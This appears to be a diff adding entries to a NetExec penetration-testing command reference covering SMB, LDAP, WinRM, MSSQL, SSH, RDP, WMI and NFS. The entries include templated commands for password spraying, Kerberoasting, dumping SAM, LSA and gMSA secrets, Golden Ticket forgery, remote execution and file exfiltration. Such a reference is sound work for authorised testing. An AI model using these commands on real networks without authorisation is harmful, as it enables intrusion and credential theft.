+{id:148,n:"LAPS Authentication",cat:"SMB",sub:"LAPS",proto:"SMB",ph:"enum",noise:"medium",acc:"Network",cred:"LAPS",purp:"Auth with LAPS password",cmd:"nxc smb <TARGET> -u <LAPS_USER> -p <PASS> --laps",tips:"Auto-retrieves LAPS password."},
+{id:149,n:"Check Spooler Service",cat:"SMB",sub:"Modules",proto:"SMB",ph:"recon",noise:"low",acc:"Network",cred:"Password",purp:"Print Spooler status",cmd:"nxc smb <TARGET> -u <USER> -p <PASS> -M spooler",tips:"Check for PrintNightmare."},
+{id:150,n:"Check WebDAV Service",cat:"SMB",sub:"Modules",proto:"SMB",ph:"recon",noise:"low",acc:"Network",cred:"Password",purp:"WebDAV status",cmd:"nxc smb <TARGET> -u <USER> -p <PASS> -M webdav",tips:"WebDAV coercion potential."},
+{id:151,n:"Dump Teams Cookies",cat:"SMB",sub:"Credential Dump",proto:"SMB",ph:"post",noise:"high",acc:"Admin",cred:"Password",purp:"Microsoft Teams cookies",cmd:"nxc smb <TARGET> -u <USER> -p <PASS> -M teams_localdb",tips:"Access Teams chats."},
+{id:152,n:"Logged-on Users",cat:"SMB",sub:"Enumeration",proto:"SMB",ph:"enum",noise:"medium",acc:"Admin",cred:"Password",purp:"List logged-on users",cmd:"nxc smb <TARGET> -u <ADMIN_USER> -p <PASS> --loggedon-users",tips:"See active sessions."},
+{id:153,n:"Interactive Sessions",cat:"SMB",sub:"Enumeration",proto:"SMB",ph:"enum",noise:"medium",acc:"Admin",cred:"Password",purp:"RDP sessions (qwinsta)",cmd:"nxc smb <TARGET> -u <ADMIN_USER> -p <PASS> --qwinsta",tips:"Required for schtask_as."},
+
+// ========== SMB - IMPERSONATION (5) ==========
+{id:154,n:"Impersonate User",cat:"SMB",sub:"Impersonation",proto:"SMB",ph:"exploit",noise:"high",acc:"Admin",cred:"Password",purp:"Execute as logged-on user",cmd:"nxc smb <TARGET> -u <ADMIN_USER> -p <PASS> -M schtask_as -o USER=<TARGET_USER> CMD=<COMMAND>",tips:"User must have interactive session."},
+{id:155,n:"Change Own Password",cat:"SMB",sub:"Impersonation",proto:"SMB",ph:"post",noise:"high",acc:"Network",cred:"Password",purp:"Change own password",cmd:"nxc smb <TARGET> -u <USER> -p <OLD_PASS> -M change-password -o NEWPASS=<NEW_PASS>",tips:"For STATUS_PASSWORD_MUST_CHANGE."},
+{id:156,n:"Change to Hash",cat:"SMB",sub:"Impersonation",proto:"SMB",ph:"post",noise:"high",acc:"Network",cred:"Password",purp:"Set password to hash",cmd:"nxc smb <TARGET> -u <USER> -p <PASS> -M change-password -o NEWNTHASH=<NT_HASH>",tips:"Set specific NT hash."},
+{id:157,n:"Reset User Password",cat:"SMB",sub:"Impersonation",proto:"SMB",ph:"post",noise:"high",acc:"Admin",cred:"Password",purp:"Reset another user",cmd:"nxc smb <TARGET> -u <USER> -p <PASS> -M change-password -o USER=<TARGET_USER> NEWPASS=<NEW_PASS>",tips:"Needs ForceChangePassword rights."},
+{id:158,n:"Dump Security Questions",cat:"SMB",sub:"Credential Dump",proto:"SMB",ph:"post",noise:"high",acc:"Admin",cred:"Password",purp:"Local security questions",cmd:"nxc smb <TARGET> -u <USER> -p <PASS> -M security-questions",tips:"Windows security questions."},
+
+// ========== LDAP (46) ==========
+{id:159,n:"LDAP Kerberos Enum",cat:"LDAP",sub:"Authentication",proto:"LDAP",ph:"enum",noise:"medium",acc:"Network",cred:"None",purp:"Check accounts via Kerberos",cmd:"nxc ldap <TARGET>/24 -u <USERS_FILE> -p '' -k",tips:"Test if accounts exist without auth."},
+{id:160,n:"LDAP Basic Auth",cat:"LDAP",sub:"Authentication",proto:"LDAP",ph:"enum",noise:"medium",acc:"Network",cred:"Password",purp:"Basic LDAP authentication",cmd:"nxc ldap <TARGET>/24 -u <USER> -p <PASS>",tips:"Domain name resolution expected."},
+{id:161,n:"LDAP Hash Auth",cat:"LDAP",sub:"Authentication",proto:"LDAP",ph:"enum",noise:"medium",acc:"Network",cred:"Hash",purp:"LDAP with NT hash",cmd:"nxc ldap <TARGET>/24 -u <USER> -H <NT_HASH>",tips:"Pass-the-hash to LDAP."},
+{id:162,n:"Enumerate Domain Users",cat:"LDAP",sub:"User Enum",proto:"LDAP",ph:"enum",noise:"medium",acc:"Domain",cred:"Password",purp:"List all domain users",cmd:"nxc ldap <TARGET> -u <USER> -p <PASS> --users",tips:"Complete user enumeration."},
+{id:163,n:"Export Users to File",cat:"LDAP",sub:"User Enum",proto:"LDAP",ph:"enum",noise:"medium",acc:"Domain",cred:"Password",purp:"Export users to file",cmd:"nxc ldap <TARGET> -u <USER> -p <PASS> --users-export <OUTPUT_FILE>",tips:"For password spraying."},
+{id:164,n:"Enumerate Active Users",cat:"LDAP",sub:"User Enum",proto:"LDAP",ph:"enum",noise:"medium",acc:"Domain",cred:"Password",purp:"Only active users",cmd:"nxc ldap <TARGET> -u <USER> -p <PASS> --active-users",tips:"Skip disabled accounts."},
+{id:165,n:"Enumerate Groups",cat:"LDAP",sub:"Group Enum",proto:"LDAP",ph:"enum",noise:"medium",acc:"Domain",cred:"Password",purp:"List domain groups",cmd:"nxc ldap <TARGET> -u <USER> -p <PASS> --groups",tips:"All domain groups."},
+{id:166,n:"Group Members",cat:"LDAP",sub:"Group Enum",proto:"LDAP",ph:"enum",noise:"medium",acc:"Domain",cred:"Password",purp:"List group members",cmd:'nxc ldap <TARGET> -u <USER> -p <PASS> --groups "Domain Admins"',tips:"Get specific group members."},
+{id:167,n:"ASREPRoast Unauth",cat:"LDAP",sub:"ASREPRoast",proto:"LDAP",ph:"cred",noise:"medium",acc:"Network",cred:"None",purp:"ASREPRoast without creds",cmd:"nxc ldap <TARGET> -u <USER> -p '' --asreproast <OUTPUT_FILE>",tips:"No pre-auth required accounts."},
+{id:168,n:"ASREPRoast User List",cat:"LDAP",sub:"ASREPRoast",proto:"LDAP",ph:"cred",noise:"medium",acc:"Network",cred:"None",purp:"ASREPRoast multiple users",cmd:"nxc ldap <TARGET> -u <USERS_FILE> -p '' --asreproast <OUTPUT_FILE>",tips:"Spray user list."},
+{id:169,n:"ASREPRoast Auth",cat:"LDAP",sub:"ASREPRoast",proto:"LDAP",ph:"cred",noise:"medium",acc:"Domain",cred:"Password",purp:"ASREPRoast with creds",cmd:"nxc ldap <TARGET> -u <USER> -p <PASS> --asreproast <OUTPUT_FILE>",tips:"Find all vulnerable users."},
+{id:170,n:"ASREPRoast KDC",cat:"LDAP",sub:"ASREPRoast",proto:"LDAP",ph:"cred",noise:"medium",acc:"Domain",cred:"Password",purp:"ASREPRoast with KDC",cmd:"nxc ldap <TARGET> -u <USER> -p <PASS> --asreproast <OUTPUT_FILE> --kdcHost <DOMAIN>",tips:"Specify KDC host."},
+{id:171,n:"Get Domain SID",cat:"LDAP",sub:"Misc",proto:"LDAP",ph:"enum",noise:"low",acc:"Domain",cred:"Password",purp:"Retrieve domain SID",cmd:"nxc ldap <TARGET> -u <USER> -p <PASS> -k --get-sid",tips:"Needed for Golden Ticket."},
+{id:172,n:"LDAP Query Basic",cat:"LDAP",sub:"Misc",proto:"LDAP",ph:"enum",noise:"low",acc:"Domain",cred:"Password",purp:"Raw LDAP query",cmd:'nxc ldap <TARGET> -u <USER> -p <PASS> --query "(sAMAccountName=Administrator)" ""',tips:"Alternative to ldapsearch."},
+{id:173,n:"LDAP Query Attributes",cat:"LDAP",sub:"Misc",proto:"LDAP",ph:"enum",noise:"low",acc:"Domain",cred:"Password",purp:"Query with attributes",cmd:'nxc ldap <TARGET> -u <USER> -p <PASS> --query "(sAMAccountName=Administrator)" "sAMAccountName pwdLastSet"',tips:"Specify returned attributes."},
+{id:174,n:"Kerberoasting",cat:"LDAP",sub:"Kerberoast",proto:"LDAP",ph:"cred",noise:"medium",acc:"Domain",cred:"Password",purp:"Get TGS tickets",cmd:"nxc ldap <TARGET> -u <USER> -p <PASS> --kerberoasting <OUTPUT_FILE>",tips:"Crack offline with hashcat -m13100."},
+{id:175,n:"Kerberoast via ASREP",cat:"LDAP",sub:"Kerberoast",proto:"LDAP",ph:"cred",noise:"medium",acc:"Network",cred:"None",purp:"Kerberoast via ASREP user",cmd:"nxc ldap <TARGET> -u <USER> -p '' --no-preauth-targets <OUTPUT_LIST> --kerberoasting <OUTPUT_FILE>",tips:"Use ASREP user for Kerberoast."},
+{id:176,n:"Find All Delegations",cat:"LDAP",sub:"Delegation",proto:"LDAP",ph:"enum",noise:"low",acc:"Domain",cred:"Password",purp:"List misconfigured delegations",cmd:"nxc ldap <TARGET> -u <USER> -p <PASS> --find-delegation",tips:"Unconstrained, Constrained, RBCD."},
+{id:177,n:"Unconstrained Delegation",cat:"LDAP",sub:"Delegation",proto:"LDAP",ph:"enum",noise:"low",acc:"Domain",cred:"Password",purp:"Find unconstrained deleg",cmd:"nxc ldap <TARGET> -u <USER> -p <PASS> --trusted-for-delegation",tips:"TRUSTED_FOR_DELEGATION flag."},
+{id:178,n:"Admin Count Users",cat:"LDAP",sub:"Misc",proto:"LDAP",ph:"enum",noise:"low",acc:"Domain",cred:"Password",purp:"Find adminCount=1",cmd:"nxc ldap <TARGET> -u <USER> -p <PASS> --admin-count",tips:"Protected admin accounts."},
+{id:179,n:"Query Admin Count",cat:"LDAP",sub:"Misc",proto:"LDAP",ph:"enum",noise:"low",acc:"Domain",cred:"Password",purp:"Query admin accounts",cmd:'nxc ldap <TARGET> -u <USER> -p <PASS> --query "(adminCount=1)" "sAMAccountName"',tips:"Alternative method."},
+{id:180,n:"Machine Account Quota",cat:"LDAP",sub:"Misc",proto:"LDAP",ph:"enum",noise:"low",acc:"Domain",cred:"Password",purp:"Check MAQ",cmd:"nxc ldap <TARGET> -u <USER> -p <PASS> -M maq",tips:"Default: 10 computer accounts."},
+{id:181,n:"Passwords in Descriptions",cat:"LDAP",sub:"Misc",proto:"LDAP",ph:"enum",noise:"low",acc:"Domain",cred:"Password",purp:"Find passwords in desc",cmd:"nxc ldap <TARGET> -u <USER> -p <PASS> -M get-desc-users",tips:"Common misconfig."},
+{id:182,n:"Dump gMSA Passwords",cat:"LDAP",sub:"gMSA",proto:"LDAP",ph:"post",noise:"medium",acc:"Domain",cred:"Password",purp:"Extract gMSA passwords",cmd:"nxc ldap <TARGET> -u <USER> -p <PASS> --gmsa",tips:"LDAPS auto-used."},
+{id:183,n:"gMSA Convert ID",cat:"LDAP",sub:"gMSA",proto:"LDAP",ph:"post",noise:"low",acc:"Domain",cred:"Password",purp:"Convert gMSA ID",cmd:"nxc ldap <TARGET> -u <USER> -p <PASS> --gmsa-convert-id <GMSA_ID>",tips:"ID from LSA dump."},
+{id:184,n:"gMSA Decrypt LSA",cat:"LDAP",sub:"gMSA",proto:"LDAP",ph:"post",noise:"low",acc:"Domain",cred:"Password",purp:"Decrypt gMSA from LSA",cmd:"nxc ldap <TARGET> -u <USER> -p <PASS> --gmsa-decrypt-lsa '<LSA_SECRET>'",tips:"Convert to NT hash."},
+{id:185,n:"List PKI Servers",cat:"LDAP",sub:"ADCS",proto:"LDAP",ph:"enum",noise:"low",acc:"Domain",cred:"Password",purp:"Find ADCS servers",cmd:"nxc ldap <TARGET> -u <USER> -p <PASS> -M adcs",tips:"Enumerate certificate services."},
+{id:186,n:"List Certificates",cat:"LDAP",sub:"ADCS",proto:"LDAP",ph:"enum",noise:"low",acc:"Domain",cred:"Password",purp:"List certificate templates",cmd:"nxc ldap <TARGET> -u <USER> -p <PASS> -M adcs -o SERVER=<CA_SERVER>",tips:"Check for ESC vulnerabilities."},
+{id:187,n:"Get Network Info",cat:"LDAP",sub:"Misc",proto:"LDAP",ph:"enum",noise:"low",acc:"Domain",cred:"Password",purp:"Extract subnet info",cmd:"nxc ldap <TARGET> -u <USER> -p <PASS> -M get-network",tips:"AD Sites and Subnets."},
+{id:188,n:"Get Hosts Only",cat:"LDAP",sub:"Misc",proto:"LDAP",ph:"enum",noise:"low",acc:"Domain",cred:"Password",purp:"Extract hosts",cmd:"nxc ldap <TARGET> -u <USER> -p <PASS> -M get-network -o ONLY_HOSTS=true",tips:"Just computer objects."},
+{id:189,n:"Get All Network",cat:"LDAP",sub:"Misc",proto:"LDAP",ph:"enum",noise:"low",acc:"Domain",cred:"Password",purp:"All network info",cmd:"nxc ldap <TARGET> -u <USER> -p <PASS> -M get-network -o ALL=true",tips:"Complete network mapping."},
+{id:190,n:"Check LDAP Signing",cat:"LDAP",sub:"Misc",proto:"LDAP",ph:"recon",noise:"low",acc:"Domain",cred:"Password",purp:"LDAP signing status",cmd:"nxc ldap <TARGET> -u <USER> -p <PASS> -M ldap-checker",tips:"Check signing/binding."},
+{id:191,n:"Read DACL",cat:"LDAP",sub:"DACL",proto:"LDAP",ph:"enum",noise:"low",acc:"Domain",cred:"Ticket",purp:"Read object DACLs",cmd:"nxc ldap <TARGET> -k --kdcHost <KDC_HOST> -M daclread -o TARGET=Administrator ACTION=read",tips:"View ACL entries."},
+{id:192,n:"DACL by Principal",cat:"LDAP",sub:"DACL",proto:"LDAP",ph:"enum",noise:"low",acc:"Domain",cred:"Ticket",purp:"Filter by principal",cmd:"nxc ldap <TARGET> -k --kdcHost <KDC_HOST> -M daclread -o TARGET=Administrator ACTION=read PRINCIPAL=<USER>",tips:"Your rights on object."},
+{id:193,n:"Find DCSync Rights",cat:"LDAP",sub:"DACL",proto:"LDAP",ph:"enum",noise:"low",acc:"Domain",cred:"Ticket",purp:"Who has DCSync",cmd:'nxc ldap <TARGET> -k --kdcHost <KDC_HOST> -M daclread -o TARGET_DN="DC=<DOMAIN>,DC=LOCAL" ACTION=read RIGHTS=DCSync',tips:"Find replication rights."},
+{id:194,n:"Backup DACLs",cat:"LDAP",sub:"DACL",proto:"LDAP",ph:"enum",noise:"low",acc:"Domain",cred:"Ticket",purp:"Backup DACLs to file",cmd:"nxc ldap <TARGET> -k --kdcHost <KDC_HOST> -M daclread -o TARGET=<TARGETS_FILE> ACTION=backup",tips:"Save for restoration."},
+{id:195,n:"BloodHound - All",cat:"LDAP",sub:"BloodHound",proto:"LDAP",ph:"enum",noise:"high",acc:"Domain",cred:"Password",purp:"Collect all BH data",cmd:"nxc ldap <TARGET> -u <USER> -p <PASS> --bloodhound --collection All",tips:"Full BloodHound collection."},
+{id:196,n:"BloodHound - Selective",cat:"LDAP",sub:"BloodHound",proto:"LDAP",ph:"enum",noise:"medium",acc:"Domain",cred:"Password",purp:"Specific collection",cmd:"nxc ldap <TARGET> -u <USER> -p <PASS> --bloodhound --collection <METHOD1>,<METHOD2>",tips:"Default, Group, LocalAdmin, etc."},
+{id:197,n:"List Domain Controllers",cat:"LDAP",sub:"Misc",proto:"LDAP",ph:"enum",noise:"low",acc:"Domain",cred:"Password",purp:"Find all DCs",cmd:"nxc ldap <TARGET> -u <USER> -p <PASS> --dc-list",tips:"DC enumeration and IPs."},
+{id:198,n:"RaiseChild Attack",cat:"LDAP",sub:"Trust Attacks",proto:"LDAP",ph:"exploit",noise:"high",acc:"Domain",cred:"Password",purp:"Child to parent escalation",cmd:"nxc ldap <TARGET> -u <USER> -p <PASS> -M raisechild",tips:"Forge Golden Ticket with extra SID."},
+{id:199,n:"RaiseChild User",cat:"LDAP",sub:"Trust Attacks",proto:"LDAP",ph:"exploit",noise:"high",acc:"Domain",cred:"Password",purp:"Specify target user",cmd:"nxc ldap <TARGET> -u <USER> -p <PASS> -M raisechild -o USER=<TARGET_USER> USER_ID=<USER_ID>",tips:"User must exist in both domains."},
+{id:200,n:"RaiseChild AES",cat:"LDAP",sub:"Trust Attacks",proto:"LDAP",ph:"exploit",noise:"high",acc:"Domain",cred:"Password",purp:"Use AES encryption",cmd:"nxc ldap <TARGET> -u <USER> -p <PASS> -M raisechild -o ETYPE=aes256",tips:"For Server 2025+ (RC4 disabled)."},
+{id:201,n:"SCCM Enumeration",cat:"LDAP",sub:"Misc",proto:"LDAP",ph:"enum",noise:"medium",acc:"Domain",cred:"Password",purp:"Enumerate SCCM",cmd:"nxc ldap <TARGET> -u <USER> -p <PASS> -M sccm -o REC_RESOLVE=TRUE",tips:"Site Servers, MPs, related objects."},
+{id:202,n:"Entra ID Sync",cat:"LDAP",sub:"Misc",proto:"LDAP",ph:"enum",noise:"low",acc:"Domain",cred:"Password",purp:"Find Entra ID sync",cmd:"nxc ldap <TARGET> -u <USER> -p <PASS> -M entra-id",tips:"MSOL account location."},
+{id:203,n:"Dump PSO",cat:"LDAP",sub:"Misc",proto:"LDAP",ph:"enum",noise:"low",acc:"Domain",cred:"Password",purp:"Fine-grained password policies",cmd:"nxc ldap <TARGET> -u <USER> -p <PASS> --pso",tips:"Password Settings Objects."},
+{id:204,n:"WinRM Spray",cat:"WinRM",sub:"Password Spray",proto:"WinRM",ph:"cred",noise:"medium",acc:"Network",cred:"Password",purp:"WinRM password spray",cmd:"nxc winrm <TARGET>/24 -u <USERS_FILE> -p <PASSWORDS_FILE> --no-bruteforce",tips:"No bruteforce recommended."},
+
+// ========== WINRM (7) ==========
+{id:205,n:"WinRM Basic Auth",cat:"WinRM",sub:"Authentication",proto:"WinRM",ph:"enum",noise:"medium",acc:"Network",cred:"Password",purp:"WinRM authentication",cmd:"nxc winrm <TARGET>/24 -u <USER> -p <PASS>",tips:"Port 5985/5986. (Pwn3d!) = Remote Management access."},
+{id:206,n:"WinRM with Domain",cat:"WinRM",sub:"Authentication",proto:"WinRM",ph:"enum",noise:"medium",acc:"Network",cred:"Password",purp:"Specify domain",cmd:"nxc winrm <TARGET>/24 -u <USER> -p <PASS> -d <DOMAIN>",tips:"Use when SMB port closed."},
+{id:207,n:"WinRM Execute",cat:"WinRM",sub:"Command Exec",proto:"WinRM",ph:"exploit",noise:"high",acc:"Admin",cred:"Password",purp:"Execute via WinRM",cmd:"nxc winrm <TARGET> -u <USER> -p <PASS> -X whoami",tips:"-X for PowerShell commands."},
+{id:208,n:"WinRM LAPS",cat:"WinRM",sub:"LAPS",proto:"WinRM",ph:"enum",noise:"medium",acc:"Network",cred:"LAPS",purp:"WinRM with LAPS",cmd:"nxc winrm <TARGET> -u <LAPS_USER> -p <PASS> --laps",tips:"Auto-retrieve LAPS password."},
+{id:209,n:"WinRM Dump SAM",cat:"WinRM",sub:"Credential Dump",proto:"WinRM",ph:"post",noise:"high",acc:"Admin",cred:"Password",purp:"Dump SAM via WinRM",cmd:"nxc winrm <TARGET>/24 -u <USER> -p <PASS> --sam",tips:"Requires admin access."},
+{id:210,n:"WinRM Dump LSA",cat:"WinRM",sub:"Credential Dump",proto:"WinRM",ph:"post",noise:"high",acc:"Admin",cred:"Password",purp:"Dump LSA via WinRM",cmd:"nxc winrm <TARGET>/24 -u <USER> -p <PASS> --lsa",tips:"Extract LSA secrets."},
+
+// ========== MSSQL (15) ==========
+{id:211,n:"MSSQL Spray",cat:"MSSQL",sub:"Password Spray",proto:"MSSQL",ph:"cred",noise:"medium",acc:"Network",cred:"Password",purp:"MSSQL password spray",cmd:"nxc mssql <TARGET>/24 -u <USERS_FILE> -p <PASSWORDS_FILE> --no-bruteforce",tips:"Use --no-bruteforce to avoid lockouts."},
+{id:212,n:"MSSQL Windows Auth",cat:"MSSQL",sub:"Authentication",proto:"MSSQL",ph:"enum",noise:"medium",acc:"Network",cred:"Password",purp:"Windows auth",cmd:"nxc mssql <TARGET> -u <USER> -p <PASS>",tips:"Default auth method."},
+{id:213,n:"MSSQL Domain Auth",cat:"MSSQL",sub:"Authentication",proto:"MSSQL",ph:"enum",noise:"medium",acc:"Network",cred:"Password",purp:"With domain",cmd:"nxc mssql <TARGET> -u <USER> -p <PASS> -d <DOMAIN>",tips:"Use when SMB closed."},
+{id:214,n:"MSSQL Local Auth",cat:"MSSQL",sub:"Authentication",proto:"MSSQL",ph:"enum",noise:"medium",acc:"Network",cred:"Password",purp:"SQL Server auth",cmd:"nxc mssql <TARGET> -u <USER> -p <PASS> --local-auth",tips:"For SA and SQL accounts."},
+{id:215,n:"MSSQL Custom Port",cat:"MSSQL",sub:"Authentication",proto:"MSSQL",ph:"enum",noise:"medium",acc:"Network",cred:"Password",purp:"Non-default port",cmd:"nxc mssql <TARGET> -u <USER> -p <PASS> --port <PORT>",tips:"Default is 1433."},
+{id:216,n:"MSSQL Check Priv",cat:"MSSQL",sub:"Privesc",proto:"MSSQL",ph:"enum",noise:"medium",acc:"Network",cred:"Password",purp:"Check impersonation",cmd:"nxc mssql <TARGET> -u <USER> -p <PASS> -M mssql_priv",tips:"Find impersonation paths."},
+{id:217,n:"MSSQL Privesc",cat:"MSSQL",sub:"Privesc",proto:"MSSQL",ph:"exploit",noise:"high",acc:"Network",cred:"Password",purp:"Escalate to sysadmin",cmd:"nxc mssql <TARGET> -u <USER> -p <PASS> -M mssql_priv -o ACTION=privesc",tips:"Exploit impersonation."},
+{id:218,n:"MSSQL Rollback",cat:"MSSQL",sub:"Privesc",proto:"MSSQL",ph:"post",noise:"medium",acc:"Network",cred:"Password",purp:"Rollback privileges",cmd:"nxc mssql <TARGET> -u <USER> -p <PASS> -M mssql_priv -o ACTION=rollback",tips:"Clean up in production!"},
+{id:219,n:"MSSQL Query",cat:"MSSQL",sub:"Queries",proto:"MSSQL",ph:"exploit",noise:"medium",acc:"Network",cred:"Password",purp:"Execute SQL query",cmd:"nxc mssql <TARGET> -u <USER> -p <PASS> --local-auth -q 'SELECT name FROM master.dbo.sysdatabases;'",tips:"Run arbitrary SQL."},
+{id:220,n:"MSSQL Upload File",cat:"MSSQL",sub:"File Transfer",proto:"MSSQL",ph:"exploit",noise:"high",acc:"Admin",cred:"Password",purp:"Upload via MSSQL",cmd:"nxc mssql <TARGET> -u <USER> -p <PASS> --put-file <LOCAL_FILE> <REMOTE_PATH>",tips:"Upload files to target."},
+{id:221,n:"MSSQL Download File",cat:"MSSQL",sub:"File Transfer",proto:"MSSQL",ph:"enum",noise:"medium",acc:"Admin",cred:"Password",purp:"Download via MSSQL",cmd:"nxc mssql <TARGET> -u <USER> -p <PASS> --get-file <REMOTE_PATH> <LOCAL_FILE>",tips:"Exfiltrate files."},
+{id:222,n:"MSSQL xp_cmdshell",cat:"MSSQL",sub:"Command Exec",proto:"MSSQL",ph:"exploit",noise:"high",acc:"Admin",cred:"Password",purp:"OS command execution",cmd:"nxc mssql <TARGET> -u <USER> -p <PASS> --local-auth -x whoami",tips:"May need to enable xp_cmdshell."},
+{id:223,n:"MSSQL RID Brute",cat:"MSSQL",sub:"Queries",proto:"MSSQL",ph:"enum",noise:"high",acc:"Network",cred:"Password",purp:"RID brute via MSSQL",cmd:"nxc mssql <TARGET>/24 -u <USER> -p <PASS> --rid-brute",tips:"Enumerate users."},
+
+// ========== SSH (5) ==========
+{id:224,n:"SSH Spray",cat:"SSH",sub:"Password Spray",proto:"SSH",ph:"cred",noise:"medium",acc:"Network",cred:"Password",purp:"SSH password spray",cmd:"nxc ssh <TARGET>/24 -u <USERS_FILE> -p <PASSWORDS_FILE> --no-bruteforce",tips:"Hydra is faster for SSH."},
+{id:225,n:"SSH Basic Auth",cat:"SSH",sub:"Authentication",proto:"SSH",ph:"enum",noise:"medium",acc:"Network",cred:"Password",purp:"SSH authentication",cmd:"nxc ssh <TARGET>/24 -u <USER> -p <PASS>",tips:"root = (Pwn3d!)"},
+{id:226,n:"SSH Custom Port",cat:"SSH",sub:"Authentication",proto:"SSH",ph:"enum",noise:"medium",acc:"Network",cred:"Password",purp:"Non-default port",cmd:"nxc ssh <TARGET>/24 --port <PORT>",tips:"Specify SSH port."},
+{id:227,n:"SSH Execute",cat:"SSH",sub:"Command Exec",proto:"SSH",ph:"exploit",noise:"high",acc:"Network",cred:"Password",purp:"Execute via SSH",cmd:"nxc ssh <TARGET> -u <USER> -p <PASS> -x whoami",tips:"Run commands."},
+{id:228,n:"SSH Upload File",cat:"SSH",sub:"File Transfer",proto:"SSH",ph:"exploit",noise:"medium",acc:"Network",cred:"Password",purp:"Upload via SSH",cmd:"nxc ssh <TARGET> -u <USER> -p <PASS> --put-file <LOCAL_FILE> <REMOTE_PATH>",tips:"SCP upload."},
+{id:229,n:"SSH Download File",cat:"SSH",sub:"File Transfer",proto:"SSH",ph:"enum",noise:"medium",acc:"Network",cred:"Password",purp:"Download via SSH",cmd:"nxc ssh <TARGET> -u <USER> -p <PASS> --get-file <REMOTE_PATH> <LOCAL_FILE>",tips:"SCP download."},
+
+// ========== FTP (5) ==========
+{id:230,n:"FTP Spray",cat:"FTP",sub:"Password Spray",proto:"FTP",ph:"cred",noise:"medium",acc:"Network",cred:"Password",purp:"FTP password spray",cmd:"nxc ftp <TARGET>/24 -u <USERS_FILE> -p <PASSWORDS_FILE> --no-bruteforce",tips:"Try anonymous:anonymous."},
+{id:231,n:"FTP List Directory",cat:"FTP",sub:"File Ops",proto:"FTP",ph:"enum",noise:"low",acc:"Network",cred:"Password",purp:"List FTP files",cmd:"nxc ftp <TARGET> -u <USER> -p <PASS> --ls",tips:"Directory listing."},
+{id:232,n:"FTP Download",cat:"FTP",sub:"File Ops",proto:"FTP",ph:"enum",noise:"medium",acc:"Network",cred:"Password",purp:"Download from FTP",cmd:"nxc ftp <TARGET> -u <USER> -p <PASS> --get <REMOTE_FILE>",tips:"Download files."},
+{id:233,n:"FTP Upload",cat:"FTP",sub:"File Ops",proto:"FTP",ph:"exploit",noise:"medium",acc:"Network",cred:"Password",purp:"Upload to FTP",cmd:"nxc ftp <TARGET> -u <USER> -p <PASS> --put <LOCAL_FILE> <REMOTE_FILE>",tips:"Requires write access."},
+
+// ========== RDP (5) ==========
+{id:234,n:"RDP Basic Spray",cat:"RDP",sub:"Password Spray",proto:"RDP",ph:"cred",noise:"medium",acc:"Network",cred:"Password",purp:"RDP authentication",cmd:"nxc rdp <TARGET>/24 -u <USER> -p <PASS>",tips:"(Pwn3d!) = RDP access."},
+{id:235,n:"RDP File Spray",cat:"RDP",sub:"Password Spray",proto:"RDP",ph:"cred",noise:"high",acc:"Network",cred:"Password",purp:"RDP spray from files",cmd:"nxc rdp <TARGET>/24 -u <USERS_FILE> -p <PASSWORDS_FILE> --no-bruteforce",tips:"Spray credentials."},
+{id:236,n:"RDP Screenshot Auth",cat:"RDP",sub:"Screenshots",proto:"RDP",ph:"post",noise:"medium",acc:"Network",cred:"Password",purp:"Screenshot with creds",cmd:"nxc rdp <TARGET> -u <USER> -p <PASS> --screenshot --screentime <SECONDS>",tips:"Capture remote screen."},
+{id:237,n:"RDP NLA Screenshot",cat:"RDP",sub:"Screenshots",proto:"RDP",ph:"recon",noise:"low",acc:"Network",cred:"None",purp:"Screenshot without auth",cmd:"nxc rdp <TARGET> --nla-screenshot",tips:"When NLA disabled."},
+{id:238,n:"RDP Execute",cat:"RDP",sub:"Command Exec",proto:"RDP",ph:"exploit",noise:"high",acc:"Admin",cred:"Password",purp:"Execute via RDP",cmd:"nxc rdp <TARGET> -u <USER> -p <PASS> -x whoami",tips:"Beta feature. May disconnect user."},
+
+// ========== WMI (6) ==========
+{id:239,n:"WMI Spray",cat:"WMI",sub:"Password Spray",proto:"WMI",ph:"cred",noise:"medium",acc:"Network",cred:"Password",purp:"WMI password spray",cmd:"nxc wmi <TARGET>/24 -u <USERS_FILE> -p <PASSWORDS_FILE>",tips:"Uses DCOM."},
+{id:240,n:"WMI No Bruteforce",cat:"WMI",sub:"Password Spray",proto:"WMI",ph:"cred",noise:"medium",acc:"Network",cred:"Password",purp:"WMI spray safe",cmd:"nxc wmi <TARGET>/24 -u <USERS_FILE> -p <PASSWORDS_FILE> --no-bruteforce",tips:"1:1 mapping."},
+{id:241,n:"WMI Windows Auth",cat:"WMI",sub:"Authentication",proto:"WMI",ph:"enum",noise:"medium",acc:"Network",cred:"Password",purp:"WMI authentication",cmd:"nxc wmi <TARGET> -u <USER> -p <PASS>",tips:"Default Windows auth."},
+{id:242,n:"WMI Domain Auth",cat:"WMI",sub:"Authentication",proto:"WMI",ph:"enum",noise:"medium",acc:"Network",cred:"Password",purp:"WMI with domain",cmd:"nxc wmi <TARGET> -u <USER> -p <PASS> -d <DOMAIN>",tips:"Specify domain."},
+{id:243,n:"WMI Local Auth",cat:"WMI",sub:"Authentication",proto:"WMI",ph:"enum",noise:"medium",acc:"Network",cred:"Password",purp:"WMI local auth",cmd:"nxc wmi <TARGET> -u <USER> -p <PASS> --local-auth",tips:"Local accounts."},
+{id:244,n:"WMI Execute",cat:"WMI",sub:"Command Exec",proto:"WMI",ph:"exploit",noise:"high",acc:"Admin",cred:"Password",purp:"Execute via WMI",cmd:"nxc wmi <TARGET> -u <USER> -p <PASS> -x whoami",tips:"WMI command exec."},
+
+// ========== NFS (12) ==========
+{id:245,n:"NFS Detect",cat:"NFS",sub:"Enumeration",proto:"NFS",ph:"recon",noise:"low",acc:"Network",cred:"None",purp:"Detect NFS server",cmd:"nxc nfs <TARGET>",tips:"Shows versions and root escape status."},
+{id:246,n:"NFS Enum Shares",cat:"NFS",sub:"Enumeration",proto:"NFS",ph:"enum",noise:"low",acc:"Network",cred:"None",purp:"List NFS exports",cmd:"nxc nfs <TARGET> --shares",tips:"UID, permissions, access list."},
+{id:247,n:"NFS List Files",cat:"NFS",sub:"Enumeration",proto:"NFS",ph:"enum",noise:"low",acc:"Network",cred:"None",purp:"List files on share",cmd:"nxc nfs <TARGET> --share '<SHARE_PATH>' --ls '/'",tips:"Directory listing."},
+{id:248,n:"NFS Enum All Files",cat:"NFS",sub:"Enumeration",proto:"NFS",ph:"enum",noise:"medium",acc:"Network",cred:"None",purp:"Enumerate all files",cmd:"nxc nfs <TARGET> --enum-shares",tips:"Recursive enumeration."},
